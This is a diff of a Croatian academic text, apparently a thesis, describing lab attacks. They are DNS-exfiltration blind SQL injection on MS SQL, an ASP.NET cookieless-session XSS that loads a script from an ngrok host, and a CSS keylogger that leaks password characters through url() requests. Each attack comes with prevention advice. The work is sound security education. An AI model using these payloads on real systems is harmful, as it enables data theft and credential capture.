@@ -1179,7 +1215,7 @@ Kako bi se na Kali Linux postavio DNS server, koristi se BIND alat. Da bi se pos
 	\end{center}
 \end{figure}
 
-U ovoj konfiguraciji je dodano da DNS sluša na portu 53, koji je namijenjen za DNS upite, i na adresama \texttt{127.0.0.1} te \texttt{192.168.56.101}. Također, nadodano je da DNS server prima upite na \texttt{localhost} i \texttt{192.168.56.0/24} mrežama te su dopušteni rekurzivni upiti što je ključni element da bi ovaj napad radio. Promjene su rađene i na dokumentu \texttt{named.conf.default-zones} koji je prikazan na slici \ref{fig:bsqli_ncdz}.
+U ovoj konfiguraciji je dodano da DNS sluša na portu 53, koji je namijenjen za DNS upite, i na adresama \texttt{127.0.0.1} te \texttt{192.168.56.101} . Također, nadodano je da DNS server prima upite na \texttt{localhost} i \texttt{192.168.56.0/24} mrežama te su dopušteni rekurzivni upiti što je ključni element da bi ovaj napad radio. Promjene su rađene i na dokumentu \texttt{named.conf.default-zones} koji je prikazan na slici \ref{fig:bsqli_ncdz}.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1197,7 +1233,7 @@ U ovom dokumentu je nadodan \texttt{arrdub.net} zona, koja je konfigurirana u do
 	\end{center}
 \end{figure}
 
-Ovom konfiguracijom je namješteno da DNS server razlučuje domenu \texttt{arrdub.net} na adresu \texttt{192.168.56.101}, što je adresa DNS server, dok se poddomena \texttt{foo.arrdub.net}, ali i svaka druga poddomena, razlučuje na adresu na kojoj se napadač nalazi, što je u ovom slučaju adresa računala \texttt{192.168.56.101}. Opisano razlučivanje adresa je se može vidjeti na sljedećoj slici \ref{fig:bsqli_nsl}.
+Ovom konfiguracijom je namješteno da DNS server razlučuje domenu \texttt{arrdub.net} na adresu \texttt{192.168.56.101}, što je adresa DNS server, dok se poddomena \texttt{foo.arrdub.net}, ali i svaka druga poddomena, razlučuje na adresu na kojoj se napadač nalazi, što je u ovom slučaju adresa računala \texttt{192.168.56.1}. Opisano razlučivanje adresa je se može vidjeti na sljedećoj slici \ref{fig:bsqli_nsl}.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1215,7 +1251,7 @@ Nakon što je potrebna mrežna infrastruktura postavljena, napadač može izvest
 	\end{center}
 \end{figure}
 
-Kako se određeni znakovi, poput jednostrukih navodnika \texttt{'} i točke zareza \texttt{;}, escape-aju prije nego se vrijednost kolačića obradi, pronađena je alternativna metoda korištenja zabranjenih znakova. Ova metoda uključuje URL kodiranje tih znakova. Ovom metodom znakovi se escape-aju, a server ih i dalje interpretira kao obične znakove. Primjer ove metode se vidi na slici \ref{fig:bsqli_pay}, gdje je znak \texttt{'} kodiran u \texttt{\%27}, znak \texttt{;} je kodiran u \texttt{\%3B}. URL dekodirana maliciozna SQL naredba prikazana je na slici \ref{fig:bsqli_payd}.
+Kako se određeni znakovi, poput jednostrukih navodnika \texttt{'} i točke zareza \texttt{;}, escape-aju prije nego se vrijednost kolačića obradi, pronađena je alternativna metoda korištenja zabranjenih znakova. Ova metoda uključuje URL kodiranje tih znakova. Ovom metodom znakovi se kodiraju, a server ih i dalje interpretira kao obične znakove. Primjer ove metode se vidi na slici \ref{fig:bsqli_pay}, gdje je znak \texttt{'} kodiran u \texttt{\%27}, a znak \texttt{;} je kodiran u \texttt{\%3B}. URL dekodirana maliciozna SQL naredba prikazana je na slici \ref{fig:bsqli_payd}.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1224,7 +1260,7 @@ Kako se određeni znakovi, poput jednostrukih navodnika \texttt{'} i točke zare
 	\end{center}
 \end{figure}
 
-Ova maliciozna naredba se sastoji od više SQL naredbi. U prvoj liniji se nalazi jednostruki navodnik \texttt{'} i točka zarez \texttt{;}, koji služe da se završi SQL upit na serveru kojim se dohvaćaju detalji korisnika na osnovu kolačića. U drugom SQL upitu se deklarira varijabla \texttt{@p} tipa \texttt{varchar}. Zatim se u sljedećem SQL upitu za vrijednost varijable \texttt{@p} postavlja SQL upit kojim se dohvaća korisničko ime korisnika sa identifikacijskim brojem 2. Tablica nad kojom napadač dohvaća podatke korisnika sa identifikacijskim brojem 2 je prikazana na slici \ref{fig:bsqli_usrs}.
+Ova maliciozna naredba se sastoji od više SQL upita. U prvoj liniji se nalazi jednostruki navodnik \texttt{'} i točka zarez \texttt{;}, koji služe da se završi SQL upit na serveru kojim se dohvaćaju detalji korisnika na osnovu kolačića. U drugom SQL upitu se deklarira varijabla \texttt{@p} tipa \texttt{varchar}. Zatim se u sljedećem SQL upitu za vrijednost varijable \texttt{@p} postavlja SQL upit kojim se dohvaća korisničko ime korisnika s identifikacijskim brojem 2. Tablica nad kojom napadač dohvaća podatke korisnika s identifikacijskim brojem 2 je prikazana na slici \ref{fig:bsqli_usrs}.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1253,7 +1289,7 @@ Slanjem ovakvog kolačića rezultira time da MS SQL baza podataka izvršava nasl
 	\end{center}
 \end{figure}
 
-Prikazani SQL upiti će vratiti detalje o korisniku na osnovu danog kolačića te će MS SQL baza podataka zatražiti DNS upit za poddomenu \texttt{e.foo.arrdub.net/a}. Kako ta poddomena ne postoji, već samo poddomena \texttt{foo.arrdub.net}, tako će se na napadačevom računalu vidjeti pokušaj dohvaćanja nepostojeće poddomene. Ovo se može vidjeti na ispisu \texttt{tcpdum} alata, koji je prikazan na slici \ref{fig:bsqli_td}.
+Prikazani SQL upiti će vratiti detalje o korisniku na osnovu danog kolačića te će MS SQL baza podataka zatražiti DNS upit za poddomenu \texttt{e.foo.arrdub.net/a}. Kako ta poddomena ne postoji, već samo poddomena \texttt{foo.arrdub.net}, tako će se na napadačevom računalu vidjeti pokušaj dohvaćanja nepostojeće poddomene. Ovo se može vidjeti na ispisu \texttt{tcpdump} alata, koji je prikazan na slici \ref{fig:bsql_td}.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1265,15 +1301,17 @@ Prikazani SQL upiti će vratiti detalje o korisniku na osnovu danog kolačića t
 U posljednjoj liniji ispisa se vidi da je zatražena poddomena \texttt{e.foo.arrdub.net}, na koju MS SQL baza podataka neće dobiti IP adresu jer ta poddomena ne postoji. Međutim, ovime je napadač uspio izvući podatke iz baze, jer se rezultat njegovog SQL upita nalazi ispred \texttt{.foo.arrdub.net} domene te on ima vrijednost \texttt{e} \cite{dnsextr}.
 
 \subsection{Sprječavanje napada}
-Sprječavanje ovog napada se može obaviti korištenjem parametriziranih upita, umjesto korištenja konkatenacije unutar upita, jer kreiranje SQL upita je podložno SQLi ranjivosti koja je opisana u ovom poglavlju. Korištenje parametriziranih upita osigurava da napadače ne može promijeniti strukturu upita, čak kada su dodani i naknadni upiti.
+Sprječavanje ovog napada se može obaviti korištenjem parametriziranih upita, umjesto korištenja konkatenacije unutar upita, jer kreiranje SQL upita je podložno SQLi ranjivosti koja je opisana u ovom poglavlju. Korištenje parametriziranih upita osigurava da napadač ne može promijeniti strukturu upita, čak kada su dodani i naknadni upiti.
 
 Jednostavan način prevencije opisanog napada je korištenje bazi podataka koje ne podržavaju izvršavanje naslaganih upita, kao što je MySQL baza podataka. Osim promjene korištene baze podataka, alternativno se preporučuje primjena ograničenja kojim baza podataka ne može izvršavati naslagane upite.
 
-Ako se iz bilo kojih razloga nije u mogućnosti primijeniti prethodna metoda prevencije napada, tada se preporučuje konfiguriranje baze podataka na takav način da ona nije u mogućnosti slati DNS zahtjeve. Kod korištene MS SQL baze podataka potrebno je napraviti dodatnu konfiguraciju baze, dok kod nekih drugih baza, poput MySQL, takve konfiguracije su postavljene kao zadane vrijednosti čim se baza instalira na sustav.
+Ako se iz bilo kojih razloga ne može primijeniti prethodna metoda prevencije napada, tada se preporučuje konfiguriranje baze podataka na takav način da ona ne može slati DNS zahtjeve. Kod korištene MS SQL baze podataka potrebno je napraviti dodatnu konfiguraciju baze, dok kod nekih drugih baza, poput MySQL, takve konfiguracije su postavljene kao zadane vrijednosti čim se baza instalira na sustav.
+
+\pagebreak
 
 \section{XSS ranjivost u ASP .NET-u} \label{xss2}
 \subsection{Opis web stranice}
-Za demonstraciju ovog napada web stranica, koja je prikazana na slici \ref{fig:asp}, napravljena je koristeći ASP .NET softverski okvir.
+Web stranica za demonstraciju ovog napada, koja je prikazana na slici \ref{fig:asp}, napravljena je koristeći ASP .NET softverski okvir.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1282,7 +1320,9 @@ Za demonstraciju ovog napada web stranica, koja je prikazana na slici \ref{fig:a
 	\end{center}
 \end{figure}
 
-Front-end kod za ovu stranicu je prikazan na slici . 
+\pagebreak
+
+Front-end kod za ovu stranicu je prikazan na slici \ref{fig:asp_f}. 
 
 \begin{figure}[H]
 	\begin{center}
@@ -1291,12 +1331,12 @@ Front-end kod za ovu stranicu je prikazan na slici .
 	\end{center}
 \end{figure}
 
-Kako za ovu demonstraciju nije potrebno nikakvo rutiranje niti komunikacija s bazom podataka, nije napravljen nikakav back-end, već je sve postavljeno na zadnjim vrijednostima.
+Kako za ovu demonstraciju nije potrebno nikakvo rutiranje niti komunikacija s bazom podataka, nije napravljen nikakav back-end, već je sve postavljeno na zadanim vrijednostima.
 
-Ova web stranica u front-end kodu sadrži \texttt{script} element koji ima atribut \texttt{src} postavljen na vrijednost \texttt{<\%= ResolveUrl("\char`\~/Script.js") \%>}. Korištenjem ove vrijednosti ASP .NET razlučuje putanju do \texttt{Script.js} dokumenta, koji se nalazi u korijenskoj datoteci aplikacije, tako da se znak tilde \texttt{\char`\~} interpretira kao putanja do korijenske datoteke web aplikacije. Na ovaj način se putanja u kodu ne treba mijenjati ako web aplikacija promjeni svoju lokaciju ili se instalira u komercijalne svrhe na nekom drugom sustavu.
+Ova web stranica u front-end kodu sadrži \texttt{script} element koji ima atribut \texttt{src} postavljen na vrijednost \texttt{<\%= ResolveUrl("\char`\~/Script.js") \%>}. Korištenjem ove vrijednosti ASP .NET razlučuje putanju do \texttt{Script.js} dokumenta, koji se nalazi u korijenskoj datoteci aplikacije, tako da se znak tilde \texttt{\char`\~} interpretira kao putanja do korijenske datoteke. Na ovaj način se putanja u kodu ne treba mijenjati ako web aplikacija promjeni svoju lokaciju ili se instalira u komercijalne svrhe na nekom drugom sustavu.
 
 \subsection{Opis napada}
-Kako je ova aplikacija napravljena na ASP .NET softverskom okviru koji sadrži određene stare funkcionalnosti koje su zastarjele i ne koriste se, tako je ona ranjiva na XSS napad. Naime, prije nego što su se kolačići za praćenje korisnika, korištena je metoda, koju je primjenjivao ASP .NET v2.0, kojom se ID sesije spremao direktno u URL. SessionStateSection.Cookieless je svojstvo pomoću kojega bi ASP .NET stavlja ID sesije u URL. Primjer opisanog URL-a s ID-om \texttt{lit3py55t21z5v55vlm25s55} je prikazana na slici \ref{fig:asp_url}.
+Kako je ova aplikacija napravljena na ASP .NET softverskom okviru koji sadrži određene stare funkcionalnosti koje su zastarjele i ne koriste se, tako je ona ranjiva na XSS napad. Naime, prije nego što su se koristili kolačići za praćenje korisnika, korištena je metoda, koju je primjenjivao ASP .NET v2.0, kojom se ID sesije spremao direktno u URL. SessionStateSection.Cookieless je svojstvo pomoću kojega ASP .NET stavlja ID sesije u URL. Primjer opisanog URL-a s ID-om \texttt{lit3py55t21z5v55vlm25s55} je prikazana na slici \ref{fig:asp_url}.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1313,16 +1353,16 @@ Identifikatori koje ovo svojstvo podržava su:
 \item (F(?), koji predstavlja autentikacijski listić forme
 \end{itemize}
 
-Zadana vrijednost svojstva \texttt{SessionStateSection.Cookieless} je postavljena na \texttt{AutoDetect}, iako čak i promjena vrijednosti svojstva na \texttt{UseCookies} ne znači da će ASP .NET generirati ikakvu grešku ako mu proslijedimo URL s ugrađenim sesijskim ID-om. To znači da pristup stranici preko URL-a \texttt{http://localhost:57819/(A(ABCD))/default.aspx} će imati isti rezultat kao i URL \texttt{http://localhost:57819/default.aspx}. Dodavanjem intenzifikatora \texttt{(A(ABCD))} ima za posljedicu da će se vrijednost \texttt{src} atributa \texttt{script} elementa razlučiti na vrijednost \texttt{}. Ovime je moguće kontrolirati URI putanju te se tako stvara XSS ranjivost. Ako napadač pristupi stranici s URL-om \texttt{http://localhost57819/(A(\%22onerror=\%22alert`1`\%22))/default.aspx} , moguće je pokrenuti JavaScript kod unutar web stranice, kao što se vidi na slici \ref{fig:asp_xss} ispod.
+Zadana vrijednost svojstva \texttt{SessionStateSection.Cookieless} je postavljena na \texttt{AutoDetect}, iako čak i promjena vrijednosti svojstva na \texttt{UseCookies} ne znači da će ASP .NET generirati ikakvu grešku ako mu proslijedimo URL s ugrađenim sesijskim ID-om. To znači da pristup stranici preko URL-a \texttt{http://localhost:57819/(A(ABCD))/default.aspx} će imati isti rezultat kao i URL \texttt{http://localhost:57819/default.aspx} . Dodavanjem identifikatora \texttt{(A(ABCD))} ima za posljedicu da će se vrijednost \texttt{src} atributa \texttt{script} elementa razlučiti na vrijednost \texttt{/(A(ABCD))/Script.js}. Ovime je moguće kontrolirati URI putanju te se tako stvara XSS ranjivost. Ako napadač pristupi stranici s URL-om \texttt{http://localhost57819/(A(\%22onerror=\%22alert`1`\%22))/default.aspx} , moguće je pokrenuti JavaScript kod unutar web stranice, kao što se vidi na slici \ref{fig:asp_xss} ispod.
 
 \begin{figure}[H]
 	\begin{center}
-		\includegraphics[width=\textwidth]{asp_xss.jpg}
+		\includegraphics[width=0.9\textwidth]{asp_xss.jpg}
 		\caption{XSS napad na ASP .NET web stranicu} \label{fig:asp_xss}
 	\end{center}
 \end{figure}
 
-Međutim, kako bi se mogla izvršavati bilo koja skripta, potrebno je preoblikovati navedeni URL. Kako bi ovo ostvarili potrebni su nam znakovi koji se koriste u JavaScriptu, kao što su:
+Međutim, kako bi se mogla izvršavati bilo koja skripta, potrebno je preoblikovati navedeni URL. Da bi ovo ostvarili potrebni su nam znakovi koji se koriste u JavaScriptu, kao što su:
 
 \begin{itemize}
 \item \%
@@ -1335,7 +1375,7 @@ Međutim, kako bi se mogla izvršavati bilo koja skripta, potrebno je preoblikov
 \item <
 \item >
 \item ?
-\item \
+\item \textbackslash
 \end{itemize}
 
 Međutim, korištenje ovih znakova rezultira \texttt{400} ili \texttt{404} greškom. Metoda koja omogućava korištenje ovih znakova je uzorak niza znakova (eng. string template), koji omogućava korištenje JavaScript izraza unutar \texttt{\$\{\}} zagrada. Upotreba string template-a je prikazana na sljedećoj slici \ref{fig:asp_ste}.
@@ -1374,7 +1414,7 @@ Pošto je izvršavanje proizvoljnih JavaScript komandi unutar URL-a složeno, na
 	\end{center}
 \end{figure}
 
-Navedena skripta ispisuje na konzoli \texttt{ASP. NET XSS napad}. Nakon što je kreirana skripta, potrebno je postaviti njezin \texttt{src} atribut na vrijednost \texttt{//0a502018ca98.ngrok.io/ASP}, što se postiže kodom \texttt{js.src='//0a502018ca98.ngrok.io/ASP'}. Međutim, kako je znak \texttt{\textbackslash} zabranjen, umjesto njega koristimo izraz \texttt{\${String.fromCharCode`47`}} unutar string template-a, koji generira znak \texttt{\textbackslash}. Kreiranu skriptu stavljamo unutar \texttt{head} elementa, što se vidi na slici \ref{fig:asp_head}.
+Navedena skripta ispisuje na skočnom prozoru \texttt{ASP. NET XSS napad}. Nakon što je kreirana skripta, potrebno je postaviti njezin \texttt{src} atribut na vrijednost \texttt{//0a502018ca98.ngrok.io/ASP}, što se postiže kodom \texttt{js.src='//0a502018ca98.ngrok.io/ASP'}. Međutim, kako je znak \texttt{/} zabranjen, umjesto njega koristimo izraz \texttt{\${String.fromCharCode`47`}} unutar string template-a, koji generira znak \texttt{/}. Kreiranu skriptu stavljamo unutar \texttt{head} elementa, što se vidi na slici \ref{fig:asp_head}.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1383,7 +1423,7 @@ Navedena skripta ispisuje na konzoli \texttt{ASP. NET XSS napad}. Nakon što je 
 	\end{center}
 \end{figure}
 
-U prvoj liniji navedenog koda \texttt{head} HTML element se sprema u varijablu \texttt{headEl}. U idućoj liniji se kreira funkcija kojom se izvršava niz znakova koji se nalazi u \texttt{hash} vrijednosti, što je u ovom slučaju \texttt{headEl.appendChild(js)}. Pozivanje funkcije koristeći string template-a je drugačije nego pozivanje funkcije sa zagradama. Naime, kada se izvodi sljedeći kod \texttt{alert`\${1}`}, tada se funkcija \texttt{alert} koristi za modificiranje string template-a \texttt{`\${1}`}. Traženo ponašanje je da funkcija \texttt{alert} primi string template \texttt{`\${1}`} kao varijablu. Opisano ponašanje se može postići korištenjem strukture koda prikazane na slici \ref{fig:asp_nf}.
+U prvoj liniji navedenog koda, \texttt{head} HTML element se sprema u varijablu \texttt{headEl}. U idućoj liniji se kreira funkcija kojom se izvršava niz znakova koji se nalaze u \texttt{hash} vrijednosti, što je u ovom slučaju \texttt{headEl.appendChild(js)}. Pozivanje funkcije koristeći string template-a je drugačije nego pozivanje funkcije sa zagradama. Naime, kada se izvodi sljedeći kod \texttt{alert`\${1}`}, tada se funkcija \texttt{alert} koristi za modificiranje string template-a \texttt{`\${1}`}. Traženo ponašanje je da funkcija \texttt{alert} primi string template \texttt{`\${1}`} kao varijablu. Opisano ponašanje se može postići korištenjem strukture koda prikazane na slici \ref{fig:asp_nf}.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1392,7 +1432,7 @@ U prvoj liniji navedenog koda \texttt{head} HTML element se sprema u varijablu \
 	\end{center}
 \end{figure}
 
-Pozivanjem prikazane funkcije rezultira \texttt{> > > [ ["LEFT", "RIGHT"], 4 ]}, gdje vidimo da je funkcija \texttt{whatsGoingOn} primila srednji argument. Ovo znači da bi se rezultat \texttt{> > > [ ["X", "X"], "alert(1)" ]} mogao dobiti izvršavanjem funkcije prikazane na slici \ref{fig:asp_funf}.
+Pozivanjem prikazane funkcije rezultira ispisom \texttt{> > > [ ["LEFT", "RIGHT"], 4 ]}, gdje vidimo da je funkcija \texttt{whatsGoingOn} primila srednji argument. Ovo znači da bi se rezultat \texttt{> > > [ ["X", "X"], "alert(1)" ]} mogao dobiti izvršavanjem funkcije prikazane na slici \ref{fig:asp_funf}.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1401,7 +1441,7 @@ Pozivanjem prikazane funkcije rezultira \texttt{> > > [ ["LEFT", "RIGHT"], 4 ]},
 	\end{center}
 \end{figure}
 
-Na kraju, konačni URL, koji sadrži XSS napad, ima oblik prikazan na slici \ref{fig:asp_final} ispod.
+Na kraju, konačni URL, koji sadrži XSS napad, ima oblik prikazan na slici \ref{fig:asp_final}.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1410,7 +1450,7 @@ Na kraju, konačni URL, koji sadrži XSS napad, ima oblik prikazan na slici \ref
 	\end{center}
 \end{figure}
 
-Pokretanje navedenog URL-a rezultira skočnim prozorom koji je prikazana na slici \ref{fig:asp_atc}.
+Pokretanje navedenog URL-a rezultira skočnim prozorom koji je prikazan na slici \ref{fig:asp_atc}.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1420,6 +1460,8 @@ Pokretanje navedenog URL-a rezultira skočnim prozorom koji je prikazana na slic
 \end{figure}
 
 Razlog ovog ponašanje je taj što je XSS napad učitao skriptu koja se nalazi na URL-u \texttt{http://0a502018ca98.ngrok.io/ASP}, čiji kod je prikazan na slici \ref{fig:asp_scpt} \cite{annapad}.
+
+\pagebreak
 
 \subsection{Sprječavanje napada}
 Pošto je ovaj napad specifičan za ASP .NET softverski okvir, on bi se mogao spriječiti prestankom podržavanja ove zastarjele funkcionalnosti.
@@ -1446,7 +1488,7 @@ PHP kod kojim je konstruirana ova stranica je prikazan na sljedećoj slici .
 	\end{center}
 \end{figure}
 
-Pretpostavimo da je prikazana stranica prikazuje neki podataka, poput korisničkog imena, kojeg generira korisnik te da se na istoj stranici upisuje lozinka ili tajni podatak u \texttt{input} element tipa \texttt{password}. Također, ova stranica simulira aspekt kontroliranih komponenti React softverskog okvira koji održava vrijednost atributa \texttt{value} kod \texttt{input} elemenata ažurnim s unesenom vrijednošću. Ovo ponašanje se može vidjeti na web stranici za prijavu na Instagram, koji je napravljen u React-u. Primjer ovoga je prikazan na slikama \ref{fig:css_inst} i \ref{fig:css_inst2}.
+Pretpostavimo da web stranica prikazuje neki podataka, poput korisničkog imena, kojeg generira korisnik te da se na istoj stranici upisuje lozinka ili tajni podatak u \texttt{input} element tipa \texttt{password}. Također, ova stranica simulira aspekt kontroliranih komponenti React softverskog okvira koji održava vrijednost atributa \texttt{value} kod \texttt{input} elemenata ažurnim s unesenom vrijednošću. Ovo ponašanje se može vidjeti na web stranici za prijavu na Instagram, koji je napravljen u React-u. Primjer ovoga je prikazan na slikama \ref{fig:css_inst} i \ref{fig:css_inst2}.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1479,7 +1521,7 @@ Na slici \ref{fig:css_inst} nije upisano niti jedno slovo, stoga je vrijednost \
 \end{figure}
 
 \subsection{Opis napada}
-Kako je opisana web stranica CSS učitava preko \texttt{link} elementa tako da \texttt{href} atribut ima vrijednost \texttt{keyloger.css}. Pošto nije dana puna putanja do \texttt{keyloger.css} dokumenta, PHP server interpretira tu vrijednost kao relativnu putanju u odnosu na putanju web stranice, odnosno dokumenta \texttt{second.php} u kojoj se nalazi kod za ovu web stranicu. Međutim, ako se na kraj URL-a doda znak \texttt{/} stranica se prikazuje bez da je učitan \texttt{keyloger.css}. Kako se na ovoj stranici nalazi tekst \texttt{{}@import url("http://localhost:8080/mid.css");}, tako stranica interpretira ovaj dio HTML-a kao CSS. Razlog tašto se to događa je taj što znakovi \texttt{\{\}} isprovociraju CSS parser da prepozna taj dio HTML-a kao CSS. Ovo se može vidjeti na sljedećoj slici \ref{fig:css_slh}.
+Opisana web stranica učitava CSS preko \texttt{link} elementa, koji \texttt{href} atribut postavljen na vrijednost \texttt{keyloger.css}. Pošto nije dana puna putanja do \texttt{keyloger.css} dokumenta, PHP server interpretira tu vrijednost kao relativnu putanju u odnosu na putanju web stranice, odnosno dokumenta \texttt{second.php} u kojoj se nalazi kod za ovu web stranicu. Međutim, ako se na kraj URL-a doda znak \texttt{/}, stranica se prikazuje bez da je učitan \texttt{keyloger.css}. Kako se na ovoj stranici nalazi tekst \texttt{{}@import url("http://localhost:8080/mid.css");}, tako stranica interpretira ovaj dio HTML-a kao CSS. Razlog zašto se to događa je taj što znakovi \texttt{\{\}} isprovociraju CSS parser da prepozna taj dio HTML-a kao CSS. Na sljedećoj slici \ref{fig:css_slh} se može vidjeti primjena \texttt{mid.css} dokumenta na web stranicu.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1488,7 +1530,7 @@ Kako je opisana web stranica CSS učitava preko \texttt{link} elementa tako da \
 	\end{center}
 \end{figure}
 
-Ovaj napad je izvediv na Internet Exploreru verziji 10, što je bitno zbog načina na koji ovaj web preglednik obrađuje CSS dokumente. Iako je web preglednik ne primjenjuje na stranicu CSS dokument koji je naveden u \texttt{link} elementu, primjena \texttt{mid.css} dokumenta na web stranicu ovisi o položaju na kojem se nalazi \texttt{link} element unutar koda web stranice. Naime, Internet Explorer dopušta prikaz web stranice u situaciji kada nisu dohvaćeni svi CSS dokumenti ako se \texttt{link} element nalazi na kraju HTML dokumenta, odnosno Internet Explorer ne radi blokiranje iscrtavanja stranice (eng. render blocking) stranice ovisno o tome dali su učitani svi CSS dokumenti. Ovo ponašanje se ne javlja u drugim web preglednicima, što se može vidjeti na primjeru Chrome web preglednika prikazanog na slici \ref{fig:css_pend} \cite{cssnapad2}.
+Ovaj napad je izvediv na Internet Exploreru verziji 10, što je bitno zbog načina na koji ovaj web preglednik obrađuje CSS dokumente. Iako web preglednik ne primjenjuje na stranicu CSS dokument koji je naveden u \texttt{link} elementu, primjena \texttt{mid.css} dokumenta na web stranicu ovisi o položaju na kojem se nalazi \texttt{link} element unutar koda web stranice. Naime, Internet Explorer dopušta prikaz web stranice u situaciji kada nisu dohvaćeni svi CSS dokumenti ako se \texttt{link} element nalazi na kraju HTML dokumenta, odnosno Internet Explorer ne radi blokiranje iscrtavanja stranice (eng. render blocking) stranice ovisno o tome dali su učitani svi CSS dokumenti. Ovo ponašanje se ne javlja u drugim web preglednicima, što se može vidjeti na primjeru Chrome web preglednika prikazanog na slici \ref{fig:css_pend} \cite{cssnapad2}.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1497,7 +1539,7 @@ Ovaj napad je izvediv na Internet Exploreru verziji 10, što je bitno zbog nači
 	\end{center}
 \end{figure}
 
-Na prikazanoj slici \ref{fig:css_pend} se vidi da na stranicu nije primijenjen CSS \texttt{evil.css} dokumenta jer nije učitan CSS dokument na putanji \texttt{localhost:8000/l?=2}. Početni CSS dokument koji se ubacuje u web stranicu je prikazan na slici te se on koristi za pozivanje \texttt{evil.css} dokumenta te \texttt{1.css} dokumenta. \texttt{Mid.css} dokument je prikazan na sljedećoj slici \ref{fig:css_midc}. 
+Na prikazanoj slici \ref{fig:css_pend} se vidi da na stranicu nije primijenjen CSS \texttt{evil.css} dokument jer nije učitan CSS dokument s putanje \texttt{localhost:8000/l?=2}. Početni CSS dokument koji se ubacuje u web stranicu je prikazan na slici te se on koristi za pozivanje \texttt{evil.css} dokumenta te \texttt{1.css} dokumenta. \texttt{Mid.css} dokument je prikazan na sljedećoj slici \ref{fig:css_midc}. 
 
 \begin{figure}[H]
 	\begin{center}
@@ -1522,7 +1564,7 @@ Dokument \texttt{evil.css} je prikazan na slikama \ref{fig:css_evil} i \ref{fig:
 	\end{center}
 \end{figure}
 
-Izrada CSS keyloggera se temelji na atribute selector-ima koji omogućavaju primjenu CSS pravila kada su zadovoljeni dani uvjeti nad vrijednosti atributa odabranog elementa. Atribut selektori se mogu primijeniti za bilo koji atribut HTML elementa te postoji više načina na koji se mogu kreirati atribut selektor pravila. Korištenjem različitih znakova nakon znaka jednako \texttt{=} unutar atribut selektor pravila mogu se postići različiti efekti koji su prikazani na slici .
+Izrada CSS keyloggera se temelji na atribute selector-ima koji omogućavaju primjenu CSS pravila kada su zadovoljeni dani uvjeti nad vrijednostima atributa odabranog elementa. Atribut selektori se mogu primijeniti za bilo koji atribut HTML elementa te postoji više načina na koji se mogu kreirati atribut selektor pravila. Korištenjem različitih znakova nakon znaka jednako \texttt{=} unutar atribut selektor pravila, mogu se postići različiti efekti koji su prikazani na slici .
 
 \begin{figure}[H]
 	\begin{center}
@@ -1540,7 +1582,7 @@ Izrada CSS keyloggera se temelji na atribute selector-ima koji omogućavaju prim
 	\end{center}
 \end{figure}
 
-Primjer primjene ovakvog CSS pravila se može vidjeti na slici \ref{fig:css_evil} u kojoj \texttt{a} element čija je vrijednost \texttt{href} atributa jednaka \texttt{http://localhost:8080}.
+Primjer primjene ovakvog CSS pravila se može vidjeti na slici \ref{fig:css_evil} u kojoj je \texttt{a} element čija je vrijednost \texttt{href} atributa jednaka \texttt{http://localhost:8080}.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1560,7 +1602,9 @@ U sljedećoj slici \ref{fig:css_ex2} se može vidjeti da navedeno CSS pravilo se
 
 CSS dopušta primjenu više atribut selektor na jedan element, stoga je moguće kreirati pravilo prikazano na slici  koje se primjenjuje na \texttt{a} element s atributom \texttt{value} postavljenu na vrijednost \texttt{test} 
 
-Kako se atribut selektori mogu primijeniti na bilo koji atribut, to znači da se oni mogu primijeniti na atribut \texttt{value} \texttt{input} elementa kojemu je atribut \texttt{type} postavljen na vrijednost \texttt{password}. CSS pravila koja imaju atribut selektore postavljene na vrijednost \texttt{value} atributa \texttt{input} elementa inače se ne bi primjenjivali jer se vrijednost \texttt{value} atributa ne ažurira s unosom podataka. Međutim, zbog kontroliranih komponenti, u React softverskom okviru, ažuriranje vrijednosti se odvija.
+Kako se atribut selektori mogu primijeniti na bilo koji atribut, to znači da se oni mogu primijeniti na atribut \texttt{value}, \texttt{input} elementa, kojemu je atribut \texttt{type} postavljen na vrijednost \texttt{password}. CSS pravila koja imaju atribut selektore postavljene na vrijednost \texttt{value} atributa \texttt{input} elementa inače se ne bi primjenjivala jer se vrijednost \texttt{value} atributa ne ažurira s unosom podataka. Međutim, zbog kontroliranih komponenti, u React softverskom okviru, ažuriranje vrijednosti se odvija.
+
+\pagebreak
 
 Ovime je objašnjeno kako se CSS pravila mogu primjenjivati ovisno o upisanoj vrijednosti. Način na koji napadač može doznati koji znak je unesen je tako da se u CSS pravilo s atribut selektorima koristi svojstvo \texttt{background-image}. Naime, ovo svojstvo se koristi za postavljanje pozadinske slike uz kombinaciju s CSS funkcijom \texttt{url()} kojom je moguće učitati sliku na osnovu putanje na računalu. Jedna od funkcionalnosti \texttt{url()} funkcije je da ona može slati HTTP zahtjeve ako se kao argument proslijedi URL. Na ovaj način CSS podržava učitanja slike preko URL-a. Mogućnost \texttt{url()} funkcije da šalje HTTP zahtjeve napadač može iskoristiti kao način na koji CSS keylogger javlja napadačevom serveru koje slovo je korisnik unio. Na kraju CSS pravilo kojim CSS keylogger javlja da je prvo slovo lozinke, slovo \texttt{a} je prikazano na slici \ref{fig:css_rule}.
 
@@ -1571,9 +1615,9 @@ Ovime je objašnjeno kako se CSS pravila mogu primjenjivati ovisno o upisanoj vr
 	\end{center}
 \end{figure}
 
-Iako napadač ima način na koji može doznati koje slovo je korisnik unio, to i dalje zahtjeva da za prvo slovo lozinke napadač napravi CSS dokument s 223 pravila, pomoću kojih se šalje HTTP zahtjev za prvo slovo lozinke. Kako lozinke općenito imaju minimalno 8 znakova to bi zahtijevalo jedno CSS pravilo za svaku tih kombinaciju 8 znakova, što bi značilo ukupno \(6.11 \times 10^{18}\) CSS pravila.
